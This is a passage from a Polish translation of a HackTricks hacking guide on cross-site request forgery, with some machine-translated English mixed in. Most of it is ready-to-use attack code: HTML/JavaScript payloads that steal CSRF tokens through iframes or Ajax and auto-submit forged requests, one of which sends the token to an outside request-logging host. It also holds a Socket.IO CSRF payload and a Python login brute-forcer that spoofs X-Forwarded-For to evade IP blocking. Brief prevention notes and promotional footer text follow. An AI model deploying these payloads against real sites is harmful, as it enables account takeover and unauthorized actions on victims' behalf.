   - Utwórz nowy formularz i ustaw jego atrybuty, takie jak akcja (URL docelowej strony) i metoda (POST).
   - Dodaj ukryte pole do formularza i ustaw jego wartość na skradziony token CSRF.
   - Dodaj formularz do drzewa DOM.
   - Wywołaj metodę submit na formularzu, aby wysłać żądanie POST z ukradzionym tokenem CSRF.
4. Po wykonaniu tych kroków, żądanie POST zostanie wysłane na docelową stronę, wykorzystując skradziony token CSRF.

Pamiętaj, że wykorzystywanie tej techniki jest nielegalne i narusza prywatność innych osób. Zawsze działaj zgodnie z prawem i etyką.
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Ukradnij token i wyślij go za pomocą 2 ramek (iframes)**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTUkradnij token CSRF za pomocą Ajaxa i wyślij żądanie POST z formularzem**

To steal a CSRF token using Ajax and send a POST request with a form, you can use the following steps:

1. Use Ajax to send a GET request to the target website and retrieve the HTML content of the page containing the CSRF token.
2. Parse the HTML content to extract the CSRF token value.
3. Create a new HTML form with the necessary input fields, including the stolen CSRF token.
4. Use Ajax to send a POST request to the target website, including the form data.
5. The target website will process the POST request, considering it as a legitimate request due to the presence of the valid CSRF token.
6. As a result, the attacker can perform actions on behalf of the victim without their knowledge or consent.

Keep in mind that this technique can be used for malicious purposes and is considered a security vulnerability. It is important to implement proper CSRF protection mechanisms to prevent such attacks.
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF z Socket.IO

Cross-Site Request Forgery (CSRF) to atak, który polega na wykorzystaniu zaufania serwera do wykonania nieautoryzowanych akcji w imieniu użytkownika. W przypadku aplikacji opartych na Socket.IO, atak CSRF może być wykorzystany do manipulacji komunikacji w czasie rzeczywistym między klientem a serwerem.

#### Sposób działania ataku CSRF z Socket.IO

1. Atakujący tworzy złośliwą stronę internetową, która zawiera kod JavaScript, który wykorzystuje Socket.IO do nawiązania połączenia z serwerem.
2. Użytkownik odwiedza złośliwą stronę, co powoduje nawiązanie połączenia z serwerem Socket.IO.
3. Serwer Socket.IO uznaje połączenie za autoryzowane, ponieważ nie sprawdza, czy żądanie pochodzi z zaufanego źródła.
4. Atakujący wykorzystuje to autoryzowane połączenie do wysyłania złośliwych żądań na serwer w imieniu użytkownika.
5. Serwer wykonuje złośliwe żądania, nieświadomy, że zostały one wysłane przez atakującego.

#### Zapobieganie atakom CSRF z Socket.IO

Aby zapobiec atakom CSRF z Socket.IO, należy zastosować odpowiednie zabezpieczenia:

1. Weryfikacja źródła żądania: Serwer Socket.IO powinien sprawdzać, czy żądanie pochodzi z zaufanego źródła, takiego jak domena aplikacji.
2. Używanie tokenów CSRF: Serwer powinien generować unikalne tokeny CSRF dla każdego żądania i wymagać, aby klient przesyłał ten token wraz z żądaniem. Serwer powinien sprawdzać, czy token jest prawidłowy przed wykonaniem żądania.
3. Ustawianie nagłówka SameSite: Ustawienie nagłówka SameSite na wartość "Strict" lub "Lax" może pomóc w ograniczeniu ataków CSRF, uniemożliwiając przesyłanie żądań z innych stron.
4. Używanie mechanizmów uwierzytelniania: Wprowadzenie mechanizmów uwierzytelniania, takich jak logowanie i uwierzytelnianie dwuskładnikowe, może dodatkowo zabezpieczyć aplikację przed atakami CSRF.

Wprowadzenie tych zabezpieczeń pomoże w minimalizacji ryzyka ataków CSRF z wykorzystaniem Socket.IO. Ważne jest, aby pamiętać o aktualizowaniu i monitorowaniu zabezpieczeń w celu zapewnienia ochrony przed nowymi zagrożeniami.
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Brute Force Logowania

Kod może być używany do Brut Force formularza logowania za pomocą tokena CSRF (Używa również nagłówka X-Forwarded-For w celu próby obejścia możliwego czarnolistowania IP):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Narzędzia <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Odwołania

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Dołącz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikować się z doświadczonymi hakerami i łowcami błędów!

**Wgląd w hakerstwo**\
Zajmuj się treściami, które zagłębiają się w emocje i wyzwania hakerstwa

**Aktualności na żywo o hakerstwie**\
Bądź na bieżąco z szybkim tempem świata hakerstwa dzięki aktualnym wiadomościom i wglądom

**Najnowsze ogłoszenia**\
Bądź na bieżąco z najnowszymi programami bug bounty i ważnymi aktualizacjami platformy

**Dołącz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij współpracować z najlepszymi hakerami już dziś!

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
